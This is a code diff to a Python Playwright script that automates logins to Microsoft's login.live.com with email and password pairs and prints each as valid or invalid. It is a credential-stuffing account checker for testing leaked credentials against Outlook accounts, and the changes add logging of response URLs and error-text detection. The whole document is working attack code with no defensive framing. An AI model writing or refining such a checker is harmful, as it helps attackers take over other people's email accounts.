@@ -8,20 +8,29 @@ async def login_outlook(email, password):
             context = await browser.new_context()
             page = await context.new_page()
 
+            print(f"[*] Checking {email}...")
+
             await page.goto("https://login.live.com/")
             await page.fill('input[type="email"]', email)
             await page.click('input[type="submit"]')
 
-            await page.wait_for_timeout(2000)  # Tunggu halaman password muncul
+            await page.wait_for_timeout(2000)
             await page.fill('input[type="password"]', password)
             await page.click('input[type="submit"]')
 
-            await page.wait_for_timeout(5000)  # Tunggu respon
+            await page.wait_for_timeout(5000)
+
+            content = await page.content()
 
             if "login.live.com" not in page.url:
                 print(f"[VALID] {email}:{password}")
+                print(f"[RESPONSE URL] {page.url}")
             else:
                 print(f"[INVALID] {email}:{password}")
+                if "error" in content.lower() or "problem" in content.lower():
+                    print(f"[INFO] Error message found in page content.")
+                else:
+                    print(f"[INFO] Login failed, but no error message visible.")
 
             await browser.close()
     except Exception as e:
